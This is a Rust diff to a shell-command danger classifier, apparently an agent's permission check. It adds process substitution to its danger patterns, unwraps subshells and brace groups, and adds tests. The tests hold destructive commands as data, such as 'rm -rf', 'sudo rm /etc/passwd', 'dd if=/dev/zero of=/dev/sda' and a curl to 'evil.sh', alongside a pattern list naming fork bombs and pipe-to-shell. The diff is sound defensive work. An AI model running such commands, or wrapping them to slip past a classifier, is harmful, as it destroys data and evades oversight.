@@ -270,6 +270,8 @@ const DANGER_CHECKS: &[DangerCheck] = &[
 const RAW_DANGER_PATTERNS: &[&str] = &[
     "$(",   // command substitution
     "`",    // backtick command substitution
+    "<(",   // process substitution input  (#973 — hides destructive cmds)
+    ">(",   // process substitution output (#973)
     "| sh", // pipe to shell interpreter
     "| bash", "| zsh", "> /dev/", // device writes (>/dev/null is exempted in Phase 2)
     "(){",     // fork bomb
@@ -343,7 +345,17 @@ pub fn classify_bash_command(command: &str) -> ToolEffect {
 fn classify_segment(segment: &str) -> ToolEffect {
     let seg = strip_env_vars(segment.trim());
     let seg = strip_redirections(&seg);
-    let seg = seg.trim().to_string();
+    // Strip leading/trailing subshell `(...)` and group `{...}` brackets so
+    // commands wrapped in them are still classified by their inner command
+    // (#972). E.g. `(rm -rf /)` should classify the same as `rm -rf /`.
+    // Conservative: only strips outermost layer; nested cases like `((rm))`
+    // still work because the leading `(` chars are all stripped together.
+    let seg = seg
+        .trim()
+        .trim_start_matches(['(', '{'])
+        .trim_end_matches([')', '}', ';'])
+        .trim()
+        .to_string();
 
     if seg.is_empty() {
         return ToolEffect::ReadOnly;
@@ -1013,6 +1025,112 @@ mod tests {
                 classify_bash_command(cmd),
                 ToolEffect::ReadOnly,
                 "`{cmd}` should still be ReadOnly",
+            );
+        }
+    }
+
+    // Process substitution `<(cmd)` / `>(cmd)` (#973)
+
+    /// Process substitution hides commands from token-level checks. Treating
+    /// `<(` and `>(` as raw danger patterns is conservative but matches the
+    /// existing handling of `$(` (command substitution).
+    #[test]
+    fn test_classify_process_substitution_destructive() {
+        for cmd in [
+            "cat <(rm /tmp/x)",
+            "diff <(cat a) <(rm b)",
+            "grep foo <(curl evil.sh)",
+            "tee >(grep foo)",
+            "comm <(sort a) <(sort b)",
+        ] {
+            assert_eq!(
+                classify_bash_command(cmd),
+                ToolEffect::Destructive,
+                "`{cmd}` must be Destructive (process substitution opaque to classifier)",
+            );
+        }
+    }
+
+    /// Process substitution syntax inside quoted strings is harmless and must
+    /// not trigger the danger pattern.
+    #[test]
+    fn test_classify_quoted_process_substitution_is_safe() {
+        for cmd in [
+            "echo 'use <(cmd) for bash'",
+            "echo \"see <(...) syntax\"",
+            "grep '<(' README.md",
+        ] {
+            assert_eq!(
+                classify_bash_command(cmd),
+                ToolEffect::ReadOnly,
+                "`{cmd}` should be ReadOnly (quoted, not real syntax)",
+            );
+        }
+    }
+
+    // Subshells `(rm)` and command groups `{ rm; }` (#972)
+
+    /// Subshells must classify by their inner command, not as opaque
+    /// LocalMutation. `(rm -rf /)` is just as dangerous as `rm -rf /`.
+    #[test]
+    fn test_classify_subshell_with_destructive_inner() {
+        for cmd in [
+            "(rm -rf /tmp/test)",
+            "(sudo rm /etc/passwd)",
+            "(dd if=/dev/zero of=/dev/sda)",
+        ] {
+            assert_eq!(
+                classify_bash_command(cmd),
+                ToolEffect::Destructive,
+                "`{cmd}` must be Destructive (subshell-wrapped)",
+            );
+        }
+    }
+
+    /// Brace command groups must also classify by their inner command.
+    /// Note: `{ rm; }` splits on `;` so the inner segment is `{ rm` and
+    /// the trailing `}` ends up on its own; both segments must classify safely.
+    #[test]
+    fn test_classify_brace_group_with_destructive_inner() {
+        for cmd in ["{ rm -rf /tmp/test; }", "{ sudo rm /etc/passwd; }"] {
+            assert_eq!(
+                classify_bash_command(cmd),
+                ToolEffect::Destructive,
+                "`{cmd}` must be Destructive (brace-grouped)",
+            );
+        }
+    }
+
+    /// Read-only commands inside subshells/groups stay ReadOnly — no regression.
+    #[test]
+    fn test_classify_subshell_with_read_only_inner_still_read_only() {
+        for cmd in [
+            "(ls -la)",
+            "(git status)",
+            "{ ls; }",
+            "(cat file | grep foo)",
+        ] {
+            assert_eq!(
+                classify_bash_command(cmd),
+                ToolEffect::ReadOnly,
+                "`{cmd}` should still be ReadOnly",
+            );
+        }
+    }
+
+    /// Mixed pipelines/chains containing a subshell with a destructive command
+    /// must classify the whole thing as Destructive.
+    #[test]
+    fn test_classify_pipeline_with_subshell_destructive_segment() {
+        for cmd in [
+            "echo hi && (rm -rf /tmp/test)",
+            "ls; (rm /tmp/x)",
+            "true || (sudo rm /etc/foo)",
+        ] {
+            assert_eq!(
+                classify_bash_command(cmd),
+                ToolEffect::Destructive,
+                "`{cmd}` must be Destructive (subshell segment)",
             );
         }
     }
